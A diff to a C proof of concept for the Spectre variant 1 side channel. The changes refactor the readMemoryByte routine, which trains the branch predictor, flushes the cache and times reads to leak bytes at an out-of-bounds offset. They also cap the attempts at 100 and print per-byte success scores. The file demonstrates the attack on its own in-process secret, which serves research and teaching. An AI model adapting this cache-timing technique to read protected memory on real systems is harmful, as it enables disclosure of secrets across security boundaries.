@@ -18,6 +18,8 @@
 #include <stdint.h>
 #include <x86intrin.h>
 
+#define MAX_TRIES 100
+
 /********************************************************************
 Victim code.
 ********************************************************************/
@@ -63,25 +65,27 @@ Analysis code
 void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2])
 {
 	static int results[256];
-	int tries, i, j, k, mix_i;
 	unsigned int junk = 0;
-	size_t training_x, x;
-	register uint64_t time1, time2;
-	volatile uint8_t *addr;
+	int j;
+	int k;
 
-	for (i = 0; i < 256; i++)
+	/* Clear results */
+	for (int i = 0; i < 256; i++)
 		results[i] = 0;
 
-	for (tries = 999; tries > 0; tries--)
+	/* For each attempt */
+	for (int tries = MAX_TRIES; tries > 0; tries--)
 	{
 
 		/* Flush array2[256*(0..255)] from cache */
-		for (i = 0; i < 256; i++)
+		for (int i = 0; i < 256; i++)
 			_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
 
 		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
-		training_x = tries % array1_size;
-		for (j = 29; j >= 0; j--)
+		size_t training_x = tries % array1_size;
+		size_t x;
+
+		for (int j = 29; j >= 0; j--)
 		{
 			_mm_clflush(&array1_size);
 
@@ -101,10 +105,13 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 		}
 
 		/* Time reads. Order is lightly mixed up to prevent stride prediction */
-		for (i = 0; i < 256; i++)
+		register uint64_t time1;
+		register uint64_t time2;
+
+		for (int i = 0; i < 256; i++)
 		{
-			mix_i = ((i * 167) + 13) & 255;
-			addr = &array2[mix_i * 512];
+			int mix_i = ((i * 167) + 13) & 255;
+			volatile uint8_t *addr = &array2[mix_i * 512];
 
 			/**
 			 * We need to accuratly measure the memory access to the current index of the
@@ -125,7 +132,8 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 
 		/* Locate highest & second-highest results results tallies in j/k */
 		j = k = -1;
-		for (i = 0; i < 256; i++)
+
+		for (int i = 0; i < 256; i++)
 		{
 			if (j < 0 || results[i] >= results[j])
 			{
@@ -140,6 +148,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
 			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
 	}
+
 	results[0] ^= junk; /* use junk so code above won’t get optimized out*/
 	value[0] = (uint8_t)j;
 	score[0] = results[j];
@@ -189,7 +198,18 @@ int main(int argc, const char **argv)
 		readMemoryByte(cache_hit_threshold, malicious_x++, value, score);
 
 		/* Display the results */
-		printf("%c", (value[0] > 31 && value[0] < 127 ? value[0] : '?'));
+		// printf("%c", (value[0] > 31 && value[0] < 127 ? value[0] : '?'));
+
+		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
+		printf("0x%02X=’%c’ score=%d ", value[0],
+		(value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+		
+		if (score[1] > 0) {
+		printf("(second best: 0x%02X=’%c’ score=%d)", value[1],
+		(value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
+		}
+
+		printf("\n");
 	}
 	printf("\n");
 	return (0);
